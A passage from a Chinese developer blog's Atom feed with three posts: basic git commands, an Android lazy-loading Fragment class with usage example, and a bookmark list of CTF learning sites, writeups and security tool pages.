src="http://upload-images.jianshu.io/upload_images/2590671-fbf6e8ddf3bd958b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git diff"></p><p>撤销未提交的修改</p><pre><code>git checkout</code></pre><p>撤回提交</p><pre><code>git reset</code></pre><p>查看提交记录</p><pre><code>git log</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-3446be699c5f2adb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git log"></p><p>查看修改一行<br>git log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1</p><p>查看具体修改内容<br>git log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1 -p</p><p>查看分支<br>    git branch    </p><p><img src="http://upload-images.jianshu.io/upload_images/2590671-2778e9e774286b00.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git branch"></p><p>建立分支<br>    git branch version1.0</p><p>切换分支<br>    git checkout version1.0</p><p>合并分支<br>    git checkout master<br>    git merge version1.0</p><p>删除分支<br>    git branch -D version1.0</p><p>与远程版本库协作<br>    git clone <a href="https://github.com/example/text.git" target="_blank" rel="noopener">https://github.com/example/text.git</a></p><p>本地修改内容同步到远程版本库<br>    git push origin master</p><p>远程版本库修改同步到本地<br>    git fetch origin master</p><p>查看远程版本库修改了那些东西<br>    git diff origin/master</p><p>之后在调用merge命令将origin/master分支上的修改合并到主分支上<br>    git merge origin/master</p><p>pull命令是相当于 fetch和merge两个命令放在一起执行<br>    git pull origon master</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Git命令行基础&quot;&gt;&lt;a href=&quot;#Git命令行基础&quot; class=&quot;headerlink&quot; title=&quot;Git命令行基础&quot;&gt;&lt;/a&gt;Git命令行基础&lt;/h2&gt;&lt;p&gt;Git是一个开源的分布式版本控制工具&lt;/p&gt;
&lt;p&gt;配置身份&lt;/p&gt;
&lt;p&gt;&lt;img src
      
    
    </summary>
    
      <category term="git" scheme="http://tea9.coding.me/categories/git/"/>
    
    
      <category term="git" scheme="http://tea9.coding.me/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>fragment懒加载</title>
    <link href="http://tea9.coding.me/2018/08/10/2018-08-10-android_lazy_fragment/"/>
    <id>http://tea9.coding.me/2018/08/10/2018-08-10-android_lazy_fragment/</id>
    <published>2018-08-09T16:00:00.000Z</published>
    <updated>2018-08-10T06:36:49.953Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Fragment懒加载"><a href="#Fragment懒加载" class="headerlink" title="Fragment懒加载"></a>Fragment懒加载</h2><p>用于viewpager+fragment布局  </p><pre><code>import android.os.Bundle;import android.view.LayoutInflater;import android.view.View;import android.view.ViewGroup;import android.view.ViewGroup.LayoutParams;import android.widget.FrameLayout;/** * &lt;h1&gt;懒加载Fragment&lt;/h1&gt; 只有创建并显示的时候才会调用onCreateViewLazy方法&lt;br&gt; * &lt;br&gt; * &lt;p&gt; * 懒加载的原理onCreateView的时候Fragment有可能没有显示出来。&lt;br&gt; * 但是调用到setUserVisibleHint(boolean isVisibleToUser),isVisibleToUser = * true的时候就说明有显示出来&lt;br&gt; * 但是要考虑onCreateView和setUserVisibleHint的先后问题所以才有了下面的代码 * &lt;p&gt; * 注意：&lt;br&gt; * 《1》原先的Fragment的回调方法名字后面要加个Lazy，比如Fragment的onCreateView方法， 就写成onCreateViewLazy &lt;br&gt; * 《2》使用该LazyFragment会导致多一层布局深度 * &lt;p&gt; * LuckyJayce */public class LazyFragment extends BaseFragment {    private boolean isInit = false;    private Bundle savedInstanceState;    public static final String INTENT_BOOLEAN_LAZYLOAD = &quot;intent_boolean_lazyLoad&quot;;    private boolean isLazyLoad = true;    private FrameLayout layout;    @Deprecated    protected final void onCreateView(Bundle savedInstanceState) {        super.onCreateView(savedInstanceState);        this.savedInstanceState = savedInstanceState;        Bundle bundle = getArguments();        if (bundle != null) {            isLazyLoad = bundle.getBoolean(INTENT_BOOLEAN_LAZYLOAD, isLazyLoad);        }        //为什么不直接getUserVisibleHint();而是通过自己存isVisibleToUserState变量判断        //因为v4的25的版本 已经调用 setUserVisibleHint(true)，结果到这里getUserVisibleHint是false        // （ps:看了FragmentManager源码Fragment被重新创建有直接赋值isVisibleToUser不知道是不是那里和之前v4有改动的地方）        //所以我默认VISIBLE_STATE_NOTSET，之前没有调用setUserVisibleHint方法，就用系统的getUserVisibleHint，否则就用setUserVisibleHint后保存的值        //总之就是调用了setUserVisibleHint 就使用setUserVisibleHint的值        boolean isVisibleToUser;        if (isVisibleToUserState == VISIBLE_STATE_NOTSET) {            isVisibleToUser = getUserVisibleHint();        } else {            isVisibleToUser = isVisibleToUserState == VISIBLE_STATE_VISIABLE;        }        if (isLazyLoad) {            if (isVisibleToUser &amp;&amp; !isInit) {                isInit = true;                onCreateViewLazy(savedInstanceState);            } else {                LayoutInflater layoutInflater = inflater;                if (layoutInflater == null) {                    layoutInflater = LayoutInflater.from(getApplicationContext());                }                layout = new FrameLayout(layoutInflater.getContext());                View view = getPreviewLayout(layoutInflater, layout);                if (view != null) {                    layout.addView(view);                }                layout.setLayoutParams(new LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT));                super.setContentView(layout);            }        } else {            isInit = true;            onCreateViewLazy(savedInstanceState);        }    }    private int isVisibleToUserState = VISIBLE_STATE_NOTSET;    //未设置值    private static final int VISIBLE_STATE_NOTSET = -1;    //可见    private static final int VISIBLE_STATE_VISIABLE = 1;    //不可见    private static final int VISIBLE_STATE_GONE = 0;    @Override    public void setUserVisibleHint(boolean isVisibleToUser) {        super.setUserVisibleHint(isVisibleToUser);        isVisibleToUserState = isVisibleToUser ? VISIBLE_STATE_VISIABLE : VISIBLE_STATE_GONE;        if (isVisibleToUser &amp;&amp; !isInit &amp;&amp; getContentView() != null) {            isInit = true;            onCreateViewLazy(savedInstanceState);            onResumeLazy();        }        if (isInit &amp;&amp; getContentView() != null) {            if (isVisibleToUser) {                isStart = true;                onFragmentStartLazy();            } else {                isStart = false;                onFragmentStopLazy();            }        }    }    protected View getPreviewLayout(LayoutInflater inflater, ViewGroup container) {        return null;    }    @Deprecated    @Override    public final void onStart() {        super.onStart();        if (isInit &amp;&amp; !isStart &amp;&amp; getUserVisibleHint()) {            isStart = true;            onFragmentStartLazy();        }    }    @Deprecated    @Override    public final void onStop() {        super.onStop();        if (isInit &amp;&amp; isStart &amp;&amp; getUserVisibleHint()) {            isStart = false;            onFragmentStopLazy();        }    }    private boolean isStart = false;    protected void onFragmentStartLazy() {    }    protected void onFragmentStopLazy() {    }    protected void onCreateViewLazy(Bundle savedInstanceState) {    }    protected void onResumeLazy() {    }    protected void onPauseLazy() {    }    protected void onDestroyViewLazy() {    }    @Override    public void setContentView(int layoutResID) {        if (isLazyLoad &amp;&amp; getContentView() != null &amp;&amp; getContentView().getParent() != null) {            layout.removeAllViews();            View view = inflater.inflate(layoutResID, layout, false);            layout.addView(view);        } else {            super.setContentView(layoutResID);        }    }    @Override    public void setContentView(View view) {        if (isLazyLoad &amp;&amp; getContentView() != null &amp;&amp; getContentView().getParent() != null) {            layout.removeAllViews();            layout.addView(view);        } else {            super.setContentView(view);        }    }    @Override    @Deprecated    public final void onResume() {        super.onResume();        if (isInit) {            onResumeLazy();        }    }    @Override    @Deprecated    public final void onPause() {        super.onPause();        if (isInit) {            onPauseLazy();        }    }    @Override    @Deprecated    public final void onDestroyView() {        super.onDestroyView();        if (isInit) {            onDestroyViewLazy();        }        isInit = false;    }}import java.lang.reflect.Field;import android.content.Context;import android.os.Bundle;import android.support.v4.app.Fragment;import android.view.LayoutInflater;import android.view.View;import android.view.ViewGroup;public class BaseFragment extends Fragment {    protected LayoutInflater inflater;    private View contentView;    private Context context;    private ViewGroup container;    @Override    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        context = getActivity().getApplicationContext();    }    @Override    public final View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {        this.inflater = inflater;        this.container = container;        onCreateView(savedInstanceState);        if (contentView == null)            return super.onCreateView(inflater, container, savedInstanceState);        return contentView;    }    protected void onCreateView(Bundle savedInstanceState) {    }    @Override    public void onDestroyView() {        super.onDestroyView();        contentView = null;        container = null;        inflater = null;    }    public Context getApplicationContext() {        return context;    }    public void setContentView(int layoutResID) {        setContentView((ViewGroup) inflater.inflate(layoutResID, container, false));    }    public void setContentView(View view) {        contentView = view;    }    public View getContentView() {        return contentView;    }    public View findViewById(int id) {        if (contentView != null)            return contentView.findViewById(id);        return null;    }    // http://stackoverflow.com/questions/15207305/getting-the-error-java-lang-illegalstateexception-activity-has-been-destroyed    @Override    public void onDetach() {        super.onDetach();        try {            Field childFragmentManager = Fragment.class.getDeclaredField(&quot;mChildFragmentManager&quot;);            childFragmentManager.setAccessible(true);            childFragmentManager.set(this, null);        } catch (NoSuchFieldException e) {            throw new RuntimeException(e);        } catch (IllegalAccessException e) {            throw new RuntimeException(e);        }    }}</code></pre><p>使用方法</p><pre><code>public class ListFragment extends LazyFragment {    @Override    protected void onCreateViewLazy(Bundle savedInstanceState) {        super.onCreateViewLazy(savedInstanceState);        // 在这里进行初始化控件 findViewById    }    @Override    protected void onResumeLazy() {        super.onResumeLazy();        // 在这里加载数据    }    @Override    protected void onDestroyViewLazy() {        super.onDestroyViewLazy();        // 在这里进行对象的释放    }}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Fragment懒加载&quot;&gt;&lt;a href=&quot;#Fragment懒加载&quot; class=&quot;headerlink&quot; title=&quot;Fragment懒加载&quot;&gt;&lt;/a&gt;Fragment懒加载&lt;/h2&gt;&lt;p&gt;用于viewpager+fragment布局  &lt;/p&gt;
&lt;pre&gt;
      
    
    </summary>
    
      <category term="android" scheme="http://tea9.coding.me/categories/android/"/>
    
    
      <category term="android" scheme="http://tea9.coding.me/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>一些ctf的链接</title>
    <link href="http://tea9.coding.me/2018/08/10/2018-08-10-ctf_relevant_link/"/>
    <id>http://tea9.coding.me/2018/08/10/2018-08-10-ctf_relevant_link/</id>
    <published>2018-08-09T16:00:00.000Z</published>
    <updated>2018-08-20T13:38:43.163Z</updated>
    
    <content type="html"><![CDATA[<p>忘了什么时候整理了！！！  </p><p><a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="noopener">ctfwiki</a>  </p><p>工具：  </p><p><a href="https://tools.pediy.com/win/debuggers.htm" target="_blank" rel="noopener">看雪CTF工具</a>  </p><hr><p>brainfuck  </p><p>fuckjs  </p><p>Writeup<br><a href="http://bobao.360.cn/ctf/detail/173.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/detail/173.html</a><br><a href="http://www.freebuf.com/articles/web/94444.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/94444.html</a>  </p><p>zip<br><a href="http://bobao.360.cn/ctf/detail/203.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/detail/203.html</a>  </p><p>cap<br><a href="http://www.jianshu.com/p/d4da13258f35" target="_blank" rel="noopener">http://www.jianshu.com/p/d4da13258f35</a>  </p><p>cap<br><a href="http://blog.csdn.net/helloc0de/article/details/68956222" target="_blank" rel="noopener">http://blog.csdn.net/helloc0de/article/details/68956222</a><br><a href="http://blog.csdn.net/sinat_34200786/article/details/76099974" target="_blank" rel="noopener">http://blog.csdn.net/sinat_34200786/article/details/76099974</a>  </p><p><a href="https://www.secpulse.com/archives/38544.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/38544.html</a><br><a href="http://bobao.360.cn/ctf/learning/136.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/learning/136.html</a>  </p><p>音速猴子<br><a href="http://47.93.205.124:8001/" target="_blank" rel="noopener">http://47.93.205.124:8001/</a>  </p><hr><p>工具<br><a href="https://www.ctftools.com/" target="_blank" rel="noopener">https://www.ctftools.com/</a><br><a href="http://www.bugku.com/" target="_blank" rel="noopener">http://www.bugku.com/</a>  </p><p>博客<br><a href="https://blog.ctftools.com/" target="_blank" rel="noopener">https://blog.ctftools.com/</a><br><a href="http://www.cnblogs.com/xuanhun/" target="_blank" rel="noopener">http://www.cnblogs.com/xuanhun/</a><br>阮一峰的网络日志<br><a href="http://www.ruanyifeng.com/blog/" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/</a>  </p><p>编码<br><a href="http://www.cnblogs.com/daban/p/5680451.html" target="_blank" rel="noopener">http://www.cnblogs.com/daban/p/5680451.html</a>  </p><p>有个练习平台<br><a href="http://blog.csdn.net/helloc0de/article/details/68956222" target="_blank" rel="noopener">http://blog.csdn.net/helloc0de/article/details/68956222</a>  </p><p>密码学<br><a href="http://blog.csdn.net/aldnoah_zero/article/details/52494982" target="_blank" rel="noopener">http://blog.csdn.net/aldnoah_zero/article/details/52494982</a><br><a href="http://blog.csdn.net/youzen_ing/article/details/73075180" target="_blank" rel="noopener">http://blog.csdn.net/youzen_ing/article/details/73075180</a><br><a href="http://www.am0s.com/ctf/179.html" target="_blank" rel="noopener">http://www.am0s.com/ctf/179.html</a><br><a href="http://bobao.360.cn/ctf/learning/136.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/learning/136.html</a>  </p><hr><p><a href="https://trailofbits.github.io/ctf/" target="_blank" rel="noopener">https://trailofbits.github.io/ctf/</a>    –介绍  </p><p><a href="https://ctftime.org/" target="_blank" rel="noopener">https://ctftime.org/</a> –ctf竞赛时间  </p><p><a href="https://time.xctf.org.cn/ctfs/" target="_blank" rel="noopener">https://time.xctf.org.cn/ctfs/</a>  –X-ctf  </p><p><a href="http://ctf.sobug.com/Steganography.php" target="_blank" rel="noopener">http://ctf.sobug.com/Steganography.php</a> –SSCTF    –四叶草  </p><p><a href="https://bctf.cn/#/about" target="_blank" rel="noopener">https://bctf.cn/#/about</a>   –百度ctf  </p><p><a href="http://www.hackdog.me/writeup/" target="_blank" rel="noopener">http://www.hackdog.me/writeup/</a>   –redrain大大  </p><p><a href="https://www.cyberchallenge.com.au/solutions.html" target="_blank" rel="noopener">https://www.cyberchallenge.com.au/solutions.html</a>  –国外站点  </p><p><a href="http://www.alictf.com/" target="_blank" rel="noopener">http://www.alictf.com/</a>      –阿里ctf  </p><hr><p><a href="http://oj.xctf.org.cn/" target="_blank" rel="noopener">http://oj.xctf.org.cn/</a>    –X-ctf题目汇总  </p><p><a href="http://hackinglab.cn/" target="_blank" rel="noopener">http://hackinglab.cn/</a>     –网络信息安全攻防学习平台  </p><p><a href="http://hackgame.blackbap.org/" target="_blank" rel="noopener">http://hackgame.blackbap.org/</a>    –习科  </p><p><a href="http://www.honyaedu.com/" target="_blank" rel="noopener">http://www.honyaedu.com/</a>    -红亚  </p><p><a href="http://www.wechall.net/" target="_blank" rel="noopener">http://www.wechall.net/</a>    –ctf外国站点  </p><p><a href="http://ctf.idf.cn/" target="_blank" rel="noopener">http://ctf.idf.cn/</a>   –IDF实验室  </p><p><a href="http://ctf.3sec.cn/" target="_blank" rel="noopener">http://ctf.3sec.cn/</a>    –Jlu.CTF  </p><p><a href="http://erange.heetian.com/CTFrace.html" target="_blank" rel="noopener">http://erange.heetian.com/CTFrace.html</a>    –合天  </p><p><a href="http://www.simplexue.com/" target="_blank" rel="noopener">http://www.simplexue.com/</a>    –西普学院  </p><p><a href="http://1111.segmentfault.com/" target="_blank" rel="noopener">http://1111.segmentfault.com/</a>    –光棍节程序员闯关秀  </p><p><a href="http://www.helloisa.com/" target="_blank" rel="noopener">http://www.helloisa.com/</a>  –一个游戏又友链了几个游戏  </p><p><a href="https://redtiger.labs.overthewire.org/" target="_blank" rel="noopener">https://redtiger.labs.overthewire.org/</a>  –外国站点web_sql  </p><hr><p><a href="https://github.com/ctfs/" target="_blank" rel="noopener">https://github.com/ctfs/</a>   –git上writeup  </p><p><a href="http://bobao.360.cn/ctf/" target="_blank" rel="noopener">http://bobao.360.cn/ctf/</a>   –360安全播报  </p><p><a href="http://sec.yka.me/" target="_blank" rel="noopener">http://sec.yka.me/</a>  –英文版writeup  </p><p><a href="http://bobao.360.cn/ctf/learning/129.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/learning/129.html</a>  –DUTCTF-2015-Writeup  </p><p><a href="http://ctf.idf.cn/index.php?g=portal&amp;m=list&amp;a=index&amp;id=10" target="_blank" rel="noopener">http://ctf.idf.cn/index.php?g=portal&amp;m=list&amp;a=index&amp;id=10</a>  –writeup  </p><p><a href="https://ctf-team.vulnhub.com/" target="_blank" rel="noopener">https://ctf-team.vulnhub.com/</a>  –国外wp  </p><p><a href="https://www.91ri.org/9482.html" target="_blank" rel="noopener">https://www.91ri.org/9482.html</a>  –91ri  </p><p><a href="http://zhuanlan.zhihu.com/wooyun/19861125" target="_blank" rel="noopener">http://zhuanlan.zhihu.com/wooyun/19861125</a> –wooyun_writeup  </p><p><a href="http://drops.wooyun.org/?s=writeup&amp;submit=%E6%90%9C%E7%B4%A2" target="_blank" rel="noopener">http://drops.wooyun.org/?s=writeup&amp;submit=%E6%90%9C%E7%B4%A2</a> –wooyun  </p><hr><p><a href="http://attach.blackbap.org/down/" target="_blank" rel="noopener">http://attach.blackbap.org/down/</a>  –习科工具下载  </p><p><a href="http://forum.cnsec.org/thread-93930-1-1.html" target="_blank" rel="noopener">http://forum.cnsec.org/thread-93930-1-1.html</a>  –ctf_tools  </p><p><a href="http://mdsec.net/wahh/tools.html" target="_blank" rel="noopener">http://mdsec.net/wahh/tools.html</a>    –tool下载  </p><p><a href="http://tool.lu/" target="_blank" rel="noopener">http://tool.lu/</a>  –在线工具集合  </p><p><a href="http://m.blog.csdn.net/blog/winkar/42458273" target="_blank" rel="noopener">http://m.blog.csdn.net/blog/winkar/42458273</a>  –一部分  </p><p><a href="http://www.ibeast.com/content/tools/ciscopassword/" target="_blank" rel="noopener">http://www.ibeast.com/content/tools/ciscopassword/</a>  –passwd_break  </p><p><a href="http://www.yellowpipe.com/yis/tools/encrypter/index.php" target="_blank" rel="noopener">http://www.yellowpipe.com/yis/tools/encrypter/index.php</a>  –编码解码  </p><p><a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a>    –js_fuck  </p><p><a href="http://www.objectif-securite.ch/ophcrack.php" target="_blank" rel="noopener">http://www.objectif-securite.ch/ophcrack.php</a>    –hash破解  </p><hr><p><a href="http://217.logdown.com/" target="_blank" rel="noopener">http://217.logdown.com/</a>    –217  </p><p><a href="http://www.blue-lotus.net" target="_blank" rel="noopener">http://www.blue-lotus.net</a>    –blue-lotus蓝莲花  </p><p><a href="http://blog.0ops.net/" target="_blank" rel="noopener">http://blog.0ops.net/</a>    –0ops  </p><p><a href="http://le4f.net/" target="_blank" rel="noopener">http://le4f.net/</a>   –le4f大牛博客  </p><p><a href="http://www.programlife.net/" target="_blank" rel="noopener">http://www.programlife.net/</a>    –代码疯子  </p><p><a href="http://appleu0.sinaapp.com/" target="_blank" rel="noopener">http://appleu0.sinaapp.com/</a>    –apple牛  </p><p><a href="http://www.syjzwjj.com/" target="_blank" rel="noopener">http://www.syjzwjj.com/</a>  –俊杰  </p><p><a href="http://blog.sycsec.com/" target="_blank" rel="noopener">http://blog.sycsec.com/</a>  –三叶草  </p><p><a href="http://www.waitalone.cn/" target="_blank" rel="noopener">http://www.waitalone.cn/</a>    –独自等待  </p><hr><p>反编译工具  </p><p>android反编译工具 <a href="https://down.52pojie.cn/Tools/Android_Tools/" target="_blank" rel="noopener">https://down.52pojie.cn/Tools/Android_Tools/</a>  </p><p>apk反编译实战<br><a href="http://www.wjdiankong.cn/apk%E8%84%B1%E5%A3%B3%E5%9C%A3%E6%88%98%E4%B9%8B-%E8%84%B1%E6%8E%89%E7%88%B1%E5%8A%A0%E5%AF%86%E5%AE%B6%E7%9A%84%E5%A3%B3/" target="_blank" rel="noopener">http://www.wjdiankong.cn/apk%E8%84%B1%E5%A3%B3%E5%9C%A3%E6%88%98%E4%B9%8B-%E8%84%B1%E6%8E%89%E7%88%B1%E5%8A%A0%E5%AF%86%E5%AE%B6%E7%9A%84%E5%A3%B3/</a>  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;忘了什么时候整理了！！！  &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ctfwiki&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;工具：  &lt;/p&gt;
&lt;p&gt;&lt;a 
      
    
    </summary>
    
      <category term="CTF" scheme="http://tea9.coding.me/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://tea9.coding.me/tags/CTF/"/>
    
  </entry>
  
</feed>
